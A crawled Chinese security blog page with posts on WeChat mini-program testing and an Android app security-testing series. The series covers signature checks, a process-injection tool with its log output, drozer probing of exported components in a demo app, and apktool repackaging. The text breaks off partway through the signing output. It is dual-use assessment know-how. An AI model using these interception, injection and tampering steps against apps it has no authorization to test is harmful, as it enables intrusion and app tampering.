<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>x51&#039;BLOG</title><meta description="与其感叹路难行，不如马上出发。"><meta property="og:type" content="blog"><meta property="og:title" content="x51&#039;BLOG"><meta property="og:url" content="https://utf32.com/"><meta property="og:site_name" content="x51&#039;BLOG"><meta property="og:description" content="与其感叹路难行，不如马上出发。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://utf32.com/img/og_image.png"><meta property="article:author" content="x51"><meta property="article:tag" content="x51"><meta property="article:tag" content="渗透"><meta property="article:tag" content="攻防"><meta property="article:tag" content="红蓝对抗"><meta property="article:tag" content="redteam"><meta property="article:tag" content="x51&#039;blog"><meta property="article:tag" content="渗透测试"><meta property="article:tag" content="网络安全"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://utf32.com"},"headline":"x51'BLOG","image":["https://utf32.com/img/og_image.png"],"author":{"@type":"Person","name":"x51"},"description":"与其感叹路难行，不如马上出发。"}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">x51</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">首页</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/x51"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-05-13T14:16:20.000Z" title="2020-05-13T14:16:20.000Z">2020-05-13</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/05/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/">微信小程序测试</a></h1><div class="content"><h3 id="小程序抓包"><a href="#小程序抓包" class="headerlink" title="小程序抓包"></a>小程序抓包</h3><p>低版本Android系统抓包方式和正常的浏览器抓包相同，导入burp证书即可。但在Android7.0+版本即使导入证书也抓不到https包，由于系统证书信任机制原因导致，解决方法：<br>1、使用低版本系统；<br>2、夜神模拟器+Proxifier；<br>Btw：更换burp版本后重新导入一下对应版本的证书文件。  </p>
<h3 id="小程序源码"><a href="#小程序源码" class="headerlink" title="小程序源码"></a>小程序源码</h3><p>每个小程序对应在微信文件目录下存在wxapkg后缀的源码包文件：<br><code>/data/data/com.tencent.mm/MicroMsg/aaa/appbrand/pkg/bbb.wxapkg</code><br><code>aaa</code>是一串hash字符(ID)，<code>bbb</code>对应的每一个小程序，在打开小程序前ls一下，打开后ls一下即可判断对应的包，pull出来。<br>反编译工具：wuWxapkg.js（github）  </p>
<h3 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h3></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-04-21T06:45:54.000Z" title="2020-04-21T06:45:54.000Z">2020-04-21</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/04/21/%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%A6%99%E7%94%A8/">钉钉机器人妙用</a></h1><div class="content"><p>前不久的一个内部小分享</p>
<p><img src="/images/pasted-102.png" alt="upload successful">  </p>
<p><img src="/images/pasted-103.png" alt="upload successful">  </p>
<p><img src="/images/pasted-104.png" alt="upload successful">  </p>
<p><img src="/images/pasted-105.png" alt="upload successful">  </p>
<p><img src="/images/pasted-106.png" alt="upload successful">  </p>
<p><img src="/images/pasted-107.png" alt="upload successful">  </p>
<p><img src="/images/pasted-108.png" alt="upload successful">  </p>
<p><img src="/images/pasted-109.png" alt="upload successful">  </p>
<p><img src="/images/pasted-110.png" alt="upload successful">  </p>
<p><img src="/images/pasted-111.png" alt="upload successful">  </p>
<p><img src="/images/pasted-112.png" alt="upload successful">  </p>
<p><img src="/images/pasted-113.png" alt="upload successful">  </p>
<p><img src="/images/pasted-114.png" alt="upload successful">  </p>
<p><img src="/images/pasted-115.png" alt="upload successful">  </p>
<p><img src="/images/pasted-116.png" alt="upload successful">  </p>
<p><img src="/images/pasted-117.png" alt="upload successful">  </p>
<p><img src="/images/pasted-118.png" alt="upload successful">  </p>
<p><img src="/images/pasted-119.png" alt="upload successful">  </p>
<p><img src="/images/pasted-120.png" alt="upload successful">  </p>
<p><img src="/images/pasted-121.png" alt="upload successful">  </p>
<p><img src="/images/pasted-122.png" alt="upload successful">  </p>
<p><img src="/images/pasted-123.png" alt="upload successful">  </p>
<p><img src="/images/pasted-124.png" alt="upload successful">  </p>
<p><img src="/images/pasted-125.png" alt="upload successful">  </p>
<p><img src="/images/pasted-126.png" alt="upload successful">  </p>
<p><img src="/images/pasted-127.png" alt="upload successful">  </p>
<p><img src="/images/pasted-128.png" alt="upload successful">  </p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-01-26T13:06:00.000Z" title="2020-01-26T13:06:00.000Z">2020-01-26</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/01/26/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97/">Android客户端安全测试系列</a></h1><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近整理Android测试工具，顺便做一个复习，部分测试环境需要现搭，可能会影响更新速度。  </p>
<h1 id="一、签名安全"><a href="#一、签名安全" class="headerlink" title="一、签名安全"></a>一、签名安全</h1><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">jarsigner</span><span class="selector-class">.exe</span> <span class="selector-tag">-verify</span> <span class="selector-tag">demo</span><span class="selector-class">.apk</span> <span class="selector-tag">-verbose</span> <span class="selector-tag">-certs</span></span><br></pre></td></tr></table></figure>

<ul>
<li>jarsigner.exe来自JAVE_PATH/bin</li>
<li>如MobSF此类工具也可直接解析签名信息，后续系列详细补充  </li>
</ul>
<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>命令执行输出摘要如下：  </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s       <span class="number">7500</span> Thu Mar <span class="number">12</span> <span class="number">12</span>:<span class="number">20</span>:<span class="number">46</span> CST <span class="number">2015</span> META-INF/MANIFEST.MF</span><br><span class="line"></span><br><span class="line">      &gt;&gt;&gt; 签名者</span><br><span class="line">      X<span class="number">.509</span>, CN=Android Debug, O=Android, C=US</span><br><span class="line">      [证书的有效期为<span class="number">7</span>/<span class="number">28</span>/<span class="number">13</span> <span class="number">4</span>:<span class="number">56</span> PM至<span class="number">7</span>/<span class="number">21</span>/<span class="number">43</span> <span class="number">4</span>:<span class="number">56</span> PM]</span><br><span class="line">      [无效的证书链: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target]</span><br><span class="line"></span><br><span class="line">        <span class="number">7553</span> Thu Mar <span class="number">12</span> <span class="number">12</span>:<span class="number">20</span>:<span class="number">46</span> CST <span class="number">2015</span> META-INF/CERT.SF</span><br><span class="line">         <span class="number">776</span> Thu Mar <span class="number">12</span> <span class="number">12</span>:<span class="number">20</span>:<span class="number">46</span> CST <span class="number">2015</span> META-INF/CERT.RSA</span><br><span class="line"></span><br><span class="line">  s = 已验证签名</span><br><span class="line">  m = 在清单中列出条目</span><br><span class="line">  k = 在密钥库中至少找到了一个证书</span><br><span class="line">  i = 在身份作用域内至少找到了一个证书</span><br><span class="line"></span><br><span class="line">- 由 <span class="string">"CN=Android Debug, O=Android, C=US"</span> 签名</span><br><span class="line">    摘要算法: SHA1</span><br><span class="line">    签名算法: SHA1withRSA, <span class="number">1024</span> 位密钥</span><br><span class="line"></span><br><span class="line">jar 已验证。</span><br><span class="line"></span><br><span class="line">警告:</span><br><span class="line">此 jar 包含其证书链无效的条目。原因: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</span><br><span class="line">此 jar 包含其签名者证书为自签名证书的条目。</span><br><span class="line">此 jar 包含的签名没有时间戳。如果没有时间戳, 则在其中任一签名者证书到期 (最早为 <span class="number">2043</span><span class="number">-07</span><span class="number">-21</span>) 之后, 用户可能无法验证此 jar。</span><br><span class="line">签名者证书将于 <span class="number">2043</span><span class="number">-07</span><span class="number">-21</span> 到期。</span><br></pre></td></tr></table></figure>
<p>关注结果：  </p>
<ul>
<li>确认是否输出<code>jar 已验证</code></li>
<li>证书签名者身份，如<code>CN=Android Debug, O=Android, C=US</code>  </li>
</ul>
<h2 id="其他说明"><a href="#其他说明" class="headerlink" title="其他说明"></a>其他说明</h2><p>从我以前做过的一些Android客户端安测案例来看，遇到的通用签名情况还是挺多，一般有外包/第三方开发团队的签名。<br>举个例子来说APK的签名，就好发公文流程，你的公文（APP）上盖的路人甲的公章（路人甲签名），然而群众（手机）看到路人甲的公章（路人甲签名）就认为（信任）是你发的公文，从这个例子就不难理解通用签名/第三方签名的风险在哪个环节了。<br>作为APP所有者，需要考虑以后的版本更新问题、私钥泄露问题等。 </p>
<h1 id="二、进程注入"><a href="#二、进程注入" class="headerlink" title="二、进程注入"></a>二、进程注入</h1><h2 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h2><p>使用工具已经放到github，方便各位乙方同学<br>项目地址：<strong><em><a href="https://github.com/x51/droidsoject">https://github.com/x51/droidsoject</a></em></strong>  </p>
<h2 id="测试结果-1"><a href="#测试结果-1" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="https://github.com/x51/droidsoject/raw/master/com.x51.demo.png" alt="avatar"></p>
<p>注入成功样例日志：  </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">D/INJECT  ( <span class="number">3738</span>): [+] Calling dlclose <span class="keyword">in</span> target process.</span><br><span class="line">D/INJECT  ( <span class="number">3738</span>): [+] Target process returned <span class="keyword">from</span> dlclose, <span class="keyword">return</span> value=<span class="number">0</span>, pc=b6f590bc</span><br><span class="line">E/WakeLock( <span class="number">1893</span>): GCM_HB_ALARM release without a matched acquire!</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Injecting process: <span class="number">3719</span></span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] get_remote_addr: local[b6f2a000], remote[b6f58000]</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Remote mmap address: b6f6ab25</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Calling mmap <span class="keyword">in</span> target process.</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Target process returned <span class="keyword">from</span> mmap, <span class="keyword">return</span> value=<span class="number">8</span>cd4c000, pc=<span class="number">0</span></span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Get imports: dlopen: b6fc6f11, dlsym: b6fc6e61, dlclose: b6fc6ddd, dlerror: b6fc6d8d</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Calling dlopen <span class="keyword">in</span> target process.</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Target process returned <span class="keyword">from</span> dlopen, <span class="keyword">return</span> value=<span class="number">90</span>c805b8, pc=<span class="number">0</span></span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Calling dlsym <span class="keyword">in</span> target process.</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Target process returned <span class="keyword">from</span> dlsym, <span class="keyword">return</span> value=<span class="number">8</span>d665c5d, pc=<span class="number">0</span></span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): hook_entry_addr = <span class="number">0x8d665c5d</span></span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Calling hook_entry <span class="keyword">in</span> target process.</span><br><span class="line">D/DEBUG   ( <span class="number">3719</span>): Hook Success, getpid = <span class="number">3719</span></span><br><span class="line">D/DEBUG   ( <span class="number">3719</span>): Hello x51</span><br><span class="line">D/DEBUG   ( <span class="number">3719</span>): You can inject some evil code here.</span><br><span class="line">D/INJECT  ( <span class="number">3933</span>): [+] Target process returned <span class="keyword">from</span> hook_entry, <span class="keyword">return</span> value=<span class="number">0</span>, pc=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>查看目标进程mmap分布<br><img src="https://github.com/x51/droidsoject/raw/master/mmap.png" alt="avatar"></p>
<h2 id="其他说明-1"><a href="#其他说明-1" class="headerlink" title="其他说明"></a>其他说明</h2><p>1、libhello.so的路径在inject中写死了<code>/data/local/tmp/libhello.so</code>，可以改但没必要.  </p>
<h1 id="三、组件安全"><a href="#三、组件安全" class="headerlink" title="三、组件安全"></a>三、组件安全</h1><h2 id="测试方法-2"><a href="#测试方法-2" class="headerlink" title="测试方法"></a>测试方法</h2><p>本节测试需要借助<code>drozer</code>来完成，关于如何安装该工具及详细介绍请移步<a href="https://labs.f-secure.com/tools/drozer]">https://labs.f-secure.com/tools/drozer]</a>  </p>
<p> 查看攻击面：  </p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dz&gt;</span> <span class="string">run app.package.attacksurface com.mwr.example.sieve</span></span><br><span class="line"><span class="attr">Attack</span> <span class="string">Surface:</span></span><br><span class="line">  <span class="attr">3</span> <span class="string">activities exported</span></span><br><span class="line">  <span class="attr">0</span> <span class="string">broadcast receivers exported</span></span><br><span class="line">  <span class="attr">2</span> <span class="string">content providers exported</span></span><br><span class="line">  <span class="attr">2</span> <span class="string">services exported</span></span><br><span class="line">    <span class="attr">is</span> <span class="string">debuggable</span></span><br></pre></td></tr></table></figure>

<p>或者直接查看AndroidManifest.xml文件中标记为<code>exported=&quot;true&quot;</code>的组件（注意到这儿的exported数量和上面差异，因为入口Activity默认是导出的）  </p>
<p><img src="/images/pasted-96.png" alt="upload successful">  </p>
<p>以activity为例，查看列表：  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app<span class="selector-class">.activity</span><span class="selector-class">.info</span> -<span class="selector-tag">a</span> com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br><span class="line">Package: com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br><span class="line">  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span>.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span>.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span>.PWList</span><br><span class="line">    Permission: null</span><br><span class="line"></span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>

<p>调用外部activity：  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; <span class="built_in">run</span> app.activity.start -h</span><br><span class="line">usage: <span class="built_in">run</span> app.activity.start [-h] [<span class="comment">--action ACTION] [--category CATEGORY [CATEGORY ...]]</span></span><br><span class="line">              [<span class="comment">--component PACKAGE COMPONENT] [--data-uri DATA_URI]</span></span><br><span class="line">              [<span class="comment">--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]</span></span><br><span class="line">              [<span class="comment">--mimetype MIMETYPE]</span></span><br><span class="line"></span><br><span class="line">Starts an Activity using <span class="keyword">the</span> formulated intent.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">Start <span class="keyword">the</span> Browser <span class="keyword">with</span> an explicit intent:</span><br><span class="line"></span><br><span class="line">    dz&gt; <span class="built_in">run</span> app.activity.start</span><br><span class="line">                <span class="comment">--component com.android.browser</span></span><br><span class="line">                            com.android.browser.BrowserActivity</span><br><span class="line">                <span class="comment">--flags ACTIVITY_NEW_TASK</span></span><br><span class="line"></span><br><span class="line">If no flags are specified, drozer will add <span class="keyword">the</span> ACTIVITY_NEW_TASK flag. To <span class="built_in">launch</span> an activity <span class="keyword">with</span> no flags:</span><br><span class="line"></span><br><span class="line">    dz&gt; <span class="built_in">run</span> app.activity.start</span><br><span class="line">                <span class="comment">--component com.android.browser</span></span><br><span class="line">                            com.android.browser.BrowserActivity</span><br><span class="line">                <span class="comment">--flags 0x0</span></span><br><span class="line"></span><br><span class="line">Starting <span class="keyword">the</span> Browser <span class="keyword">with</span> an implicit intent:</span><br><span class="line"></span><br><span class="line">    dz&gt; <span class="built_in">run</span> app.activity.start</span><br><span class="line">                <span class="comment">--action android.intent.action.VIEW</span></span><br><span class="line">                <span class="comment">--data-uri http://www.google.com</span></span><br><span class="line">                <span class="comment">--flags ACTIVITY_NEW_TASK</span></span><br><span class="line"></span><br><span class="line">For more information <span class="keyword">on</span> how <span class="keyword">to</span> formulate an Intent, type 'help intents'.</span><br><span class="line"></span><br><span class="line">Last Modified: <span class="number">2012</span><span class="number">-11</span><span class="number">-06</span></span><br><span class="line">Credit: MWR InfoSecurity (@mwrlabs)</span><br><span class="line">License: BSD (<span class="number">3</span> clause)</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, <span class="comment">--help</span></span><br><span class="line">  <span class="comment">--action ACTION       specify the action to include in the Intent</span></span><br><span class="line">  <span class="comment">--category CATEGORY [CATEGORY ...]</span></span><br><span class="line">                        specify <span class="keyword">the</span> category <span class="keyword">to</span> include <span class="keyword">in</span> <span class="keyword">the</span> Intent</span><br><span class="line">  <span class="comment">--component PACKAGE COMPONENT</span></span><br><span class="line">                        specify <span class="keyword">the</span> component <span class="built_in">name</span> <span class="keyword">to</span> include <span class="keyword">in</span> <span class="keyword">the</span> Intent</span><br><span class="line">  <span class="comment">--data-uri DATA_URI   specify a Uri to attach as data in the Intent</span></span><br><span class="line">  <span class="comment">--extra TYPE KEY VALUE</span></span><br><span class="line">                        add an field <span class="keyword">to</span> <span class="keyword">the</span> Intent's extras bundle</span><br><span class="line">  <span class="comment">--flags FLAGS [FLAGS ...]</span></span><br><span class="line">                        specify one-<span class="keyword">or</span>-more flags <span class="keyword">to</span> include <span class="keyword">in</span> <span class="keyword">the</span> Intent</span><br><span class="line">  <span class="comment">--mimetype MIMETYPE   specify the MIME type to send in the Intent</span></span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>

<h2 id="测试结果-2"><a href="#测试结果-2" class="headerlink" title="测试结果"></a>测试结果</h2><p>开始测试，Activity调用时需要先完全退出APP，避免影响结果。<br>直接调用：  </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">run</span> <span class="selector-tag">app</span><span class="selector-class">.activity</span><span class="selector-class">.start</span> <span class="selector-tag">--component</span> <span class="selector-tag">com</span><span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span> <span class="selector-tag">com</span><span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span><span class="selector-class">.FileSelectActivity</span></span><br></pre></td></tr></table></figure>
<p>调用成功效果：<br><img src="/images/pasted-97.png" alt="upload successful">  </p>
<p>在这儿一般出现的安全问题有本地拒绝服务、越权等问题，比如经典的手势密码绕过。  </p>
<p>调用Service发生本地拒绝服务实例： </p>
<p><img src="/images/pasted-98.png" alt="upload successful">  </p>
<h2 id="其他说明-2"><a href="#其他说明-2" class="headerlink" title="其他说明"></a>其他说明</h2><p>除了Activity组件，还有Service、Broadcast Reciever、Content Provider，测试方式大同小异，一般来说APP的主入口Activity是必须导出的，根据功能还需导出部分Service等，所以还是要以实际危害结果为主。<br>BTW：MobSF的动态检测功能包含了组件导出安全测试，会自动调用暴露组件并生成截图，效果不错。  </p>
<h1 id="四、客户端完整性校验"><a href="#四、客户端完整性校验" class="headerlink" title="四、客户端完整性校验"></a>四、客户端完整性校验</h1><h2 id="测试方法-3"><a href="#测试方法-3" class="headerlink" title="测试方法"></a>测试方法</h2><p>这儿只考虑静态校验文件完整性，所以操作简易，不考虑其他绕过或修复等情况，简单来说流程：反编译——增/删/改文件——回编——签名——安装，结果以最终成功运行且改动生效为准。  </p>
<p>apktool反编译：  </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">I:</span> Using Apktool <span class="number">2.4</span><span class="number">.0</span> on xxx.apk</span><br><span class="line"><span class="string">I:</span> Loading resource table...</span><br><span class="line"><span class="string">I:</span> Decoding AndroidManifest.xml with resources...</span><br><span class="line"><span class="string">S:</span> <span class="string">WARNING:</span> Could not write to (<span class="regexp">/home/</span>john<span class="regexp">/.local/</span>share<span class="regexp">/apktool/</span>framework), using /tmp instead...</span><br><span class="line"><span class="string">S:</span> Please be aware <span class="keyword">this</span> is a <span class="keyword">volatile</span> directory and frameworks could go missing, please utilize --frame-path <span class="keyword">if</span> the <span class="keyword">default</span> storage directory is unavailable</span><br><span class="line"><span class="string">I:</span> Loading resource table from <span class="string">file:</span> <span class="regexp">/tmp/</span><span class="number">1.</span>apk</span><br><span class="line"><span class="string">I:</span> Regular manifest <span class="keyword">package</span>...</span><br><span class="line"><span class="string">I:</span> Decoding file-resources...</span><br><span class="line"><span class="string">I:</span> Decoding values *<span class="comment">/* XMLs...</span></span><br><span class="line"><span class="comment">I: Baksmaling classes.dex...</span></span><br><span class="line"><span class="comment">I: Baksmaling classes2.dex...</span></span><br><span class="line"><span class="comment">I: Copying assets and libs...</span></span><br><span class="line"><span class="comment">I: Copying unknown files...</span></span><br><span class="line"><span class="comment">I: Copying original files...</span></span><br></pre></td></tr></table></figure>
<p>建议修改客户端名称，位于<code>./res/values/strings.xml</code>  </p>
<p><img src="/images/pasted-99.png" alt="upload successful"><br>回编译过程：  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">I: Using Apktool 2.4.0</span><br><span class="line">I: Checking whether sources has changed<span class="built_in">..</span>.</span><br><span class="line">I: Smaling smali folder into classes.dex<span class="built_in">..</span>.</span><br><span class="line">I: Checking whether sources has changed<span class="built_in">..</span>.</span><br><span class="line">I: Smaling smali_classes2 folder into classes2.dex<span class="built_in">..</span>.</span><br><span class="line">I: Checking whether resources has changed<span class="built_in">..</span>.</span><br><span class="line">I: Building resources<span class="built_in">..</span>.</span><br><span class="line">S: WARNING: Could <span class="keyword">not</span> write <span class="keyword">to</span> (/home/john/.local/share/apktool/framework), using /tmp instead<span class="built_in">..</span>.</span><br><span class="line">S: Please be aware this is a volatile directory <span class="keyword">and</span> frameworks could go missing, please utilize --frame-path <span class="keyword">if</span> the<span class="built_in"> default </span>storage directory is unavailable</span><br><span class="line">I: Copying libs<span class="built_in">..</span>. (/lib)</span><br><span class="line">I: Copying libs<span class="built_in">..</span>. (/kotlin)</span><br><span class="line">I: Building apk file<span class="built_in">..</span>.</span><br><span class="line">I: Copying unknown files/dir<span class="built_in">..</span>.</span><br><span class="line">I: Built apk<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>

<p>成功后还需签名，不然提示<code>Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES]</code>  </p>
<p>使用测试签名对回编译后的apk文件签名：  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_exact_french.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_exact_hebrew.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_exact_italian.txt</span><br><span class="line">  正在签名: org<span 